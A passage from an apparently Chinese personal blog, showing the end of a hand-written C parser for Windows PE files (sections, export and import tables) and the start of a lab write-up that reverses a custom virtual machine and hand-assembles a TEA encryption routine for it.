class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">115</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				section_name[j] = p_section_header[j];</span><br><span class="line">			&#125;</span><br><span class="line">			section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">			VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">			PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">			VA += image_base;</span><br><span class="line">			PA += image_base;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">			p_section_header += <span class="number">0x28</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取datadirarray数组</span></span><br><span class="line">	UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">	UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">116</span>) || (mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">2</span>] == <span class="number">116</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取导出表</span></span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		export_s:</span><br><span class="line">			UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">			UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			<span class="keyword">if</span> (etname == fbuffer)</span><br><span class="line">			&#123;</span><br><span class="line">				fapi = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;correct already..\n\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> export_s;</span><br><span class="line">			&#125;</span><br><span class="line">			UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">			UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">			UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Export Table:\n&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, etname);</span><br><span class="line">			<span class="keyword">int</span> flag;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = <span class="number">0</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					flag = <span class="number">1</span>;</span><br><span class="line">					<span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">						flag = <span class="number">0</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//获取导入表</span></span><br><span class="line">		<span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">			<span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				UINT8* original_first_thunk = import_table;</span><br><span class="line">				UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">				UINT8* itname = <span class="built_in">vtop</span>(itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">				UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">				<span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line">					<span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">						n_stru += <span class="number">2</span>;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					name_stru += <span class="number">8</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">				import_table += <span class="number">0x14</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(fbuffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>-s -t 模式打印节区和两张表；</p>
<p><img src="https://s2.loli.net/2022/11/12/xzwolNHZFephGKX.png" alt="end?"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>只能说，纯手撸会有些不完善的bug，逻辑上和测试上是没问题的，有些偏移有问题，用微软自带的结构体应该是能解决这个毛病的，而且更好写，想用什么内容直接指就行了；</p>
<p>没有模块化也是bug模糊的问题之一；</p>
<p>写下来对PE有更深刻的理解；</p>
<p><img src="https://s2.loli.net/2022/11/12/tsp7CmQUhZd6nRI.png" alt="genshin"></p>
</div></div><a class="button-hover more" href="/SecondBC/2022/11/12/PE%E7%AE%80%E5%8D%95%E8%A7%A3%E6%9E%90%E5%99%A8/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/">2022-syc-bin二面</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-11-06</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Syc/">Syc</a></div></div><div class="post-content"><div class="main-content content"><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote>
<p>逆向一个虚拟机，编写适应于其的二进制文件，实现tea算法；</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/10/31/XlNWK2jqOH4iMDv.png" alt="main"></p>
<p>上图左侧为main函数，逻辑就是读取名称 “binary” 的内容，然后将其赋给code，之后将code扔进vm函数充当指令集；</p>
<p>每条指令分三个数值，一个指令数，两个操作数，分别给了instru和One，Two变量；</p>
<p>根据输入不同的instru变量来调用不同的函数，这些函数就是指令执行的操作了，翻译如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">code[<span class="number">8</span>] 是计数器 -&gt; i</span><br><span class="line"></span><br><span class="line">code[<span class="number">9</span>] 是flag 控制数</span><br><span class="line"></span><br><span class="line">code[<span class="number">7</span>] 是栈针</span><br><span class="line"></span><br><span class="line">code[<span class="number">6</span>] 用于实现加法</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">    </span><br><span class="line"><span class="number">0</span> code[one] = two 	++i</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = one	 ++code[<span class="number">7</span>]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[one]	++code[<span class="number">7</span>]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[<span class="number">8</span>] + <span class="number">1</span>	++code[<span class="number">7</span>]	code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> code[one] = code[two]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> code[one + <span class="number">10</span> + code[<span class="number">6</span>]] += code[two] 	++i</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> code[one] = code[code[<span class="number">6</span>] + <span class="number">10</span> + two]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">8</span> code[one] &lt; &lt; = two	++i</span><br><span class="line"></span><br><span class="line"><span class="number">9</span> code[one] &gt; &gt; = two	++i</span><br><span class="line"></span><br><span class="line">a code[one] += code[two + <span class="number">10</span> + code[<span class="number">6</span>]]	++i</span><br><span class="line"></span><br><span class="line">b code[one] ^= code[two]	++i</span><br><span class="line"></span><br><span class="line">c <span class="keyword">if</span>( !code[<span class="number">9</span>] ) -&gt; code[<span class="number">8</span>] = one ; <span class="keyword">else</span> ++i</span><br><span class="line"></span><br><span class="line">d end</span><br><span class="line"></span><br><span class="line">e <span class="keyword">if</span>(two &lt; = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​	&#123;	</span><br><span class="line"></span><br><span class="line">​		<span class="keyword">if</span>(two = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​				code[<span class="number">9</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​		<span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">​				code[<span class="number">9</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">else</span> -&gt; code[<span class="number">9</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​	++i</span><br><span class="line"></span><br><span class="line">f --code[<span class="number">7</span>]	code[one] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> --code[<span class="number">7</span>]	code[<span class="number">8</span>] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">11</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += two	++i</span><br><span class="line"></span><br><span class="line"><span class="number">12</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += code[code[<span class="number">6</span>] + <span class="number">10</span> + two]   ++i</span><br><span class="line"></span><br><span class="line"><span class="number">13</span> code[one] = cin	++i</span><br><span class="line"></span><br><span class="line"><span class="number">14</span> cout code[one]   ++i</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">	所以<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>都表示入栈，<span class="number">3</span>表示call因为改变了计数器；f，<span class="number">10</span>表示出栈，<span class="number">10</span>表示<span class="keyword">return</span>；</span><br></pre></td></tr></table></figure>

<p> 由此对照机械码手撸汇编：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//赋初值</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>	<span class="number">6</span> <span class="number">32</span>			mov reg6, <span class="number">50</span>			</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">11223344</span>		push <span class="number">11223344</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">22334455</span>		push <span class="number">22334455</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">33445566</span>		push <span class="number">33445566</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">44556677</span>		push <span class="number">44556677</span>h</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环输入</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>	<span class="number">0</span> <span class="number">0</span>				add reg60, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">tag1:</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>	<span class="number">0</span>				mov reg0, cin</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>	<span class="number">0</span>				push [reg0]</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>	<span class="number">0</span> <span class="number">1</span>				add reg60, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e	<span class="number">0</span> <span class="number">4</span>				cmp reg60, <span class="number">4</span>	</span><br><span class="line"></span><br><span class="line">c	<span class="number">43</span>				jnz	tag1</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用cry以及输出</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>	<span class="number">4</span>E				call cry</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">0</span>				mov cout, reg0</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">1</span>				mov cout, reg1</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">2</span>				mov cout, reg2</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">3</span>				mov cout, reg3</span><br><span class="line"></span><br><span class="line">d						retn</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//cry实现</span></span><br><span class="line"></span><br><span class="line">cry:</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">9E3779</span><span class="function">B9		push	<span class="title">delta</span>	<span class="params">(push后code[<span class="number">7</span>] = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// v[4]</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	0 E				mov 	reg0, [esp + 6]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	1 F				mov 	reg1, [esp + 5]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	2 10			mov 	reg2, [esp + 4]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	3 11			mov 	reg3, [esp + 3]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0	3C 0				mov reg60, 0	</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">11	0 0					add reg60, 0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">tag2:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//sum</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">1</span> <span class="number">13</span>				add reg61, [esp + <span class="number">2</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">1</span>				mov reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> A					add reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">1</span>				mov reg63, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">1</span>				mov reg64, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> B					add reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">0</span>					add reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">0</span> <span class="number">3</span>E				mov reg0,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">0</span>				mov reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> C					add reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">0</span>				mov reg63, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">0</span>				mov reg64, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> D					add reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">1</span>					add reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">1</span> <span class="number">3</span>E				mov reg1 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">3</span>				mov reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span 